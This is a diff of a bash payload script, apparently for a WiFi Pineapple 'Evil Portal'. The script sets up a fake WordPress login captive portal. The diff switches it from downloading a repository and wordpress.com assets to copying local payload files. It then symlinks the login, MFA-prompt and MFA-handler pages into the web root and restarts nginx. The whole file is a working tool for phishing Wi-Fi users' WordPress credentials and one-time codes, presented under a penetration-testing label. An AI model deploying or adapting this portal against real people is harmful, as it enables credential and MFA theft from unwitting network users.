@@ -1,8 +1,8 @@
 #!/bin/bash
 # Name: WordPress Portal
-# Description: Downloads and activates the WordPress captive portal template
+# Description: Activates the WordPress captive portal template
 # Author: PentestPlaybook
-# Version: 1.3
+# Version: 1.4
 # Category: Evil Portal
 
 # ====================================================================
@@ -15,8 +15,9 @@ else
 fi
 
 LOG "Detected Portal IP: ${PORTAL_IP}"
-REPO_URL="https://github.com/PentestPlaybook/auth-relay-framework/archive/refs/heads/main.tar.gz"
-REPO_DIR="/root/auth-relay-framework"
+
+# Get the directory where the payload is located
+PAYLOAD_DIR="/root/payloads/user/evil_portal/wordpress_portal"
 PORTAL_DIR="/root/portals/Wordpress"
 
 # ====================================================================
@@ -60,24 +61,21 @@ EOF
 fi
 
 # ====================================================================
-# STEP 1: Download Repository
+# STEP 1: Verify Payload Files Exist
 # ====================================================================
-LOG "Step 1: Downloading auth-relay-framework repository..."
+LOG "Step 1: Verifying payload files..."
 
-cd /root
-rm -rf auth-relay-framework auth-relay-framework-main auth-relay-framework.tar.gz
-
-wget "${REPO_URL}" -O auth-relay-framework.tar.gz
-if [ $? -ne 0 ]; then
-    LOG "ERROR: Failed to download repository"
+if [ ! -d "${PAYLOAD_DIR}/files" ]; then
+    LOG "ERROR: files/ directory not found in payload directory"
     exit 1
 fi
 
-tar -xzf auth-relay-framework.tar.gz
-mv auth-relay-framework-main auth-relay-framework
-rm auth-relay-framework.tar.gz
+if [ ! -f "${PAYLOAD_DIR}/files/index.php" ]; then
+    LOG "ERROR: index.php not found in files/ directory"
+    exit 1
+fi
 
-LOG "SUCCESS: Repository downloaded"
+LOG "SUCCESS: Payload files verified"
 
 # ====================================================================
 # STEP 2: Create Wordpress Portal Directory
@@ -87,37 +85,25 @@ LOG "Step 2: Setting up Wordpress portal directory..."
 mkdir -p "${PORTAL_DIR}/images"
 mkdir -p "${PORTAL_DIR}/wp-includes/fonts"
 
-# Copy PHP/HTML files from repo
-cp ${REPO_DIR}/wordpress/captive-portal/setup/pineapple/web-root/* "${PORTAL_DIR}/"
+# Copy all files from payload files/ directory
+cp "${PAYLOAD_DIR}/files/"*.php "${PORTAL_DIR}/"
+cp "${PAYLOAD_DIR}/files/"*.html "${PORTAL_DIR}/"
+cp "${PAYLOAD_DIR}/files/"*.css "${PORTAL_DIR}/"
+cp "${PAYLOAD_DIR}/files/"*.js "${PORTAL_DIR}/"
+cp "${PAYLOAD_DIR}/files/"*.ep "${PORTAL_DIR}/" 2>/dev/null
+
+# Copy images
+cp "${PAYLOAD_DIR}/files/images/"* "${PORTAL_DIR}/images/"
+
+# Copy fonts
+cp "${PAYLOAD_DIR}/files/wp-includes/fonts/"* "${PORTAL_DIR}/wp-includes/fonts/"
 
 LOG "SUCCESS: Portal files copied"
 
 # ====================================================================
-# STEP 3: Download WordPress Static Assets
+# STEP 3: Create Captive Portal Detection Files
 # ====================================================================
-LOG "Step 3: Downloading WordPress static assets..."
-
-cd "${PORTAL_DIR}"
-
-# CSS and JS
-wget -q "https://wordpress.com/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,buttons,forms,l10n,login&ver=6.8.2" -O wp-login.css
-wget -q "https://wordpress.com/wp-admin/load-scripts.php?c=0&load%5Bchunk_0%5D=clipboard,jquery-core,jquery-migrate,zxcvbn-async,wp-hooks&ver=6.8.2" -O wp-scripts.js
-
-# Images
-wget -q "https://wordpress.com/wp-admin/images/wordpress-logo.svg" -O images/wordpress-logo.svg
-wget -q "https://wordpress.com/wp-admin/images/w-logo-blue.png" -O images/w-logo-blue.png
-
-# Fonts
-wget -q "https://wordpress.com/wp-includes/fonts/dashicons.woff2" -O wp-includes/fonts/dashicons.woff2
-wget -q "https://wordpress.com/wp-includes/fonts/dashicons.ttf" -O wp-includes/fonts/dashicons.ttf
-wget -q "https://wordpress.com/wp-includes/fonts/dashicons.eot" -O wp-includes/fonts/dashicons.eot
-
-LOG "SUCCESS: Static assets downloaded"
-
-# ====================================================================
-# STEP 4: Create Captive Portal Detection Files
-# ====================================================================
-LOG "Step 4: Creating captive portal detection files..."
+LOG "Step 3: Creating captive portal detection files..."
 
 cat > "${PORTAL_DIR}/generate_204.html" << EOF
 <!DOCTYPE html>
@@ -148,17 +134,29 @@ EOF
 LOG "SUCCESS: Detection files created"
 
 # ====================================================================
-# STEP 5: Activate Portal via Symlinks
+# STEP 4: Activate Portal via Symlinks
 # ====================================================================
-LOG "Step 5: Activating Wordpress portal via symlinks..."
+LOG "Step 4: Activating Wordpress portal via symlinks..."
 
 # Clear /www
 rm -rf /www/*
 
 # Create symlinks for PHP files
 ln -sf "${PORTAL_DIR}/index.php" /www/index.php
-ln -sf "${PORTAL_DIR}/MyPortal.php" /www/MyPortal.php
 ln -sf "${PORTAL_DIR}/helper.php" /www/helper.php
+
+# Create symlinks for HTML files
+ln -sf "${PORTAL_DIR}/login.html" /www/login.html
+ln -sf "${PORTAL_DIR}/login_error.html" /www/login_error.html
+ln -sf "${PORTAL_DIR}/mfa.html" /www/mfa.html
+ln -sf "${PORTAL_DIR}/mfa_failed.html" /www/mfa_failed.html
+ln -sf "${PORTAL_DIR}/success.html" /www/success.html
+
+# Create symlinks for PHP handlers
+ln -sf "${PORTAL_DIR}/login_result.php" /www/login_result.php
+ln -sf "${PORTAL_DIR}/mfa_handler.php" /www/mfa_handler.php
+ln -sf "${PORTAL_DIR}/mfa_result.php" /www/mfa_result.php
+ln -sf "${PORTAL_DIR}/mfa_status.php" /www/mfa_status.php
 
 # Create symlinks for captive portal detection
 ln -sf "${PORTAL_DIR}/generate_204.html" /www/generate_204
@@ -176,9 +174,9 @@ ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
 LOG "SUCCESS: Portal activated via symlinks"
 
 # ====================================================================
-# STEP 6: Restart nginx
+# STEP 5: Restart nginx
 # ====================================================================
-LOG "Step 6: Restarting nginx..."
+LOG "Step 5: Restarting nginx..."
 
 nginx -t
 if [ $? -ne 0 ]; then
@@ -193,7 +191,7 @@ LOG "SUCCESS: nginx restarted"
 # ====================================================================
 # Verification
 # ====================================================================
-LOG "Step 7: Verifying installation..."
+LOG "Step 6: Verifying installation..."
 
 if curl -s http://${PORTAL_IP}/ | grep -q "WordPress"; then
     LOG "SUCCESS: Wordpress portal is responding"
@@ -209,7 +207,7 @@ LOG "Portal files: ${PORTAL_DIR}/"
 LOG "Active via symlinks in: /www/"
 LOG ""
 LOG "To switch back to Default portal:"
-LOG "  Run the 'Activate Default Portal' payload"
+LOG "  Run the 'Default Portal' payload"
 LOG "=================================================="
 
 exit 0
